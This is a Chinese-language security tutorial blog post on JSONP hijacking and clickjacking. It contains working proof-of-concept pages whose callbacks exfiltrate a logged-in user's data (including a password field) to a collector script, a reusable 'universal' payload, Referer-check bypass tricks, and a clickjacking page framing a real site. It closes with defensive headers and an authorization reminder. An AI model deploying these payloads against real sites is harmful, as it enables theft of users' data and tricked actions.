---
title: "XSS6"
slug: xss6
cover: ""
date: 2024-09-13
halo:
  site: http://www.hzhsec.top
  name: 497e810f-5b7d-4442-b7ea-5fd1d0399415
  publish: false
---

JSONP（JSON with Padding）是一种用于解决跨域数据请求的变通方案，核心原理是**利用 `<script>` 标签的跨域特性绕过同源策略**。通过将返回内容包裹在回调函数中，使得数据以 JavaScript 的形式被执行。

<!--more-->

# JSONP 点击劫持漏洞

JSONP（JSON with Padding）是一种用于解决跨域数据请求的变通方案，核心原理是**利用 `<script>` 标签的跨域特性绕过同源策略**。通过将返回内容包裹在回调函数中，使得数据以 JavaScript 的形式被执行。

早期前后端分离尚不成熟时，这类接口设计比较常见，若后端在返回时直接把敏感数据通过回调函数输出并信任 `callback` 参数，就可能被攻击者利用来窃取登录用户的数据。

---

## 漏洞原理与利用流程

1. 找到返回敏感信息的 JSONP 接口（例如返回用户信息且依赖 session 登录态）。  
2. 构造一个恶意页面 `jsonp.html`，在页面中通过 `<script src="...callback=attackerFunction">` 加载目标接口。  
3. 当登录用户访问该恶意页面时，目标接口会以 `attackerFunction({...})` 形式返回敏感数据，攻击者的 `attackerFunction` 会在页面中接收并外带这些数据到攻击者服务器。

---

## 演示 Demo（后端模拟接口）

示例接口：`http://test:8069/test.php`

```php
<?php
header('Content-type:application/json');
error_reporting(0);
session_start();

$callback = $_GET['callback'];
$name = $_GET['name']; // 模拟 admin 的 session

if ($name == 'admin') {
    echo $callback."({'id':1,'name':'Sentiment','pwd':'123456','key':'88888'})";
}
?>
```

当用户以 admin 登录并访问：`http://test:8069/test.php?callback=testme`，返回：  

```
testme({'id':1,'name':'Sentiment'})
```

攻击者可以把这个返回结果在其页面中接收并外带敏感信息。

---

## PoC（恶意页面示例）

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>poc</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
<script>
function testname(v) {
    alert("json hack");
    var h = '';
    for (var key in v) {
        var a = key + ':' + v[key] + ' ,';
        h += a;
    }
    alert(h);
    // 数据外带
    $.get('http://localhost:3000/js_xss/value.php?value=' + encodeURIComponent(h));
}
</script>

<!-- 访问目标 JSONP 接口并将回调绑定到 testname -->
<script src="http://127.0.0.1:3000/js_xss/test.php?callback=testname&name=admin"></script>
</body>
</html>
```

后端接收示例（PHP）可把接收到的数据写入文件：

```php
<?php
$value = $_GET['value'];
if ($value) {
    $file = fopen('value.txt', 'w+');
    if ($file) {
        $value = base64_decode($value);
        fwrite($file, $value);
        fclose($file);
    } else {
        error_log("Failed to open file: value.txt");
    }
} else {
    error_log("No value parameter provided");
}
?>
```

---

## 常用 Payload（万能 PoC）

```html
<!DOCTYPE html>
<html lang='en'>
<head>
  <meta name="referrer" content="never" charset="utf-8">
  <title>jsonp</title>
</head>
<body>
  <h1>万能poc</h1>
</body>
<script type="text/javascript">
function testname(data) {
    var hacker_data = JSON.stringify(data);
    document.write("<p>" + hacker_data + "</p>");
    alert(hacker_data);
    var xmlHttp = new XMLHttpRequest();
    var url = "http://localhost:3000/js_xss/value.php?value=" + btoa(hacker_data);
    xmlHttp.open("GET", url, true);
    xmlHttp.send(null);
}
</script>
<script src="http://127.0.0.1:3000/js_xss/test.php?callback=testname&name=admin"></script>
</html>
```

---

## JSONP 绕过技巧

### 绕过 Referer 检测

- 有些站点仅简单检查 Referer 中是否包含自身域名字段（如 `assc.com`），可以在恶意页面 URL 中加入该字段来绕过（`http://attack.com/1.html?a=assc.com`）。  
- 有时站点允许空 Referer，可利用 `iframe` 加载 `javascript:` 伪协议来发起无 Referer 请求：

```html
<iframe src="javascript:'<script>function testname(data){alert(JSON.stringify(data));}</script><script src=http://127.0.0.1:3000/js_xss/test.php?callback=testname&name=admin></script>'" frameborder="0"></iframe>
```

工具： https://github.com/yuebusao/jsonp-burp-killer

### JSONP 导致 XSS 的条件

- 当返回的 MIME 类型或处理方式使浏览器将响应当作可执行脚本（例如 `text/html`）时，且服务端直接把 `callback` 未做校验地拼接到输出中，可能导致反射型 XSS。  
- PHP 默认 `Content-Type` 常为 `text/html`，在某些情况下需特别关注 PHP 后端的 JSONP 接口。

---

# 点击劫持漏洞（Clickjacking）

点击劫持是一种利用 UI 覆盖诱导用户误点击的攻击，攻击者在其页面上用透明或半透明的 `iframe` 嵌入目标页面，并在上面放置诱导点击的元素，使得用户以为在点击攻击者页面的按钮，实际上是在操作目标页面的敏感按钮（例如删除、授权、支付等）。

---

## 点击劫持 PoC

```html
<!DOCTYPE HTML>
<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head>
  <title>点击劫持</title>
  <style>
    html,body,iframe { display:block; height:100%; width:100%; margin:0; padding:0; border:none; }
    iframe { opacity:0.5; filter:alpha(opacity=0); position:absolute; z-index:2; }
    button { position:absolute; top:450px; left:850px; z-index:1; width:72px; height:26px; }
  </style>
</head>
<body>
  万万想不到
  <button>查看详情</button>
  <iframe src="https://www.baidu.com/p/9536743109"></iframe>
</body>
</html>
```

注释：通过调整 `iframe` 的 `opacity`、按钮位置（`top`/`left`）及大小，可将按钮对准目标页面上的敏感操作按钮，诱导点击。

---

## 防护（抗点击劫持）

最简单且常用的防护方式是禁止敏感页面被 `iframe` 嵌入，常见实现方式：

### 使用 X-Frame-Options 响应头

- `DENY`：禁止任何站点通过 iframe 嵌入该页面。  
- `SAMEORIGIN`：只允许同源页面通过 iframe 嵌入。  
- `ALLOW-FROM uri`：允许特定来源嵌入（部分浏览器兼容性问题）。

示例（PHP）：

```php
header("X-Frame-Options: DENY");
```

### 使用 CSP 的 frame-ancestors 指令

```http
Content-Security-Policy: frame-ancestors 'self';
```

### 其他补充措施

- 使用 `SameSite`（`Lax` 或 `Strict`）减少跨站请求携带 cookie，降低攻击成功率。  
- 对重要操作增加二次确认或验证码、使用 POST 验证来源、检测 Referer/Origin 并拒绝异常来源。

---

<img src="/static/wx.png" alt="防护示意">

---

## 合规与建议

- 在进行此类测试或复现时，请先获取明确书面授权并限定测试范围/窗口。  
- 对发现的高危问题（如能外带凭据或导致敏感操作被触发）应立刻与目标方沟通并给出修复建议（例如添加 HttpOnly、设置 X-Frame-Options、限制 JSONP 回调白名单）。

---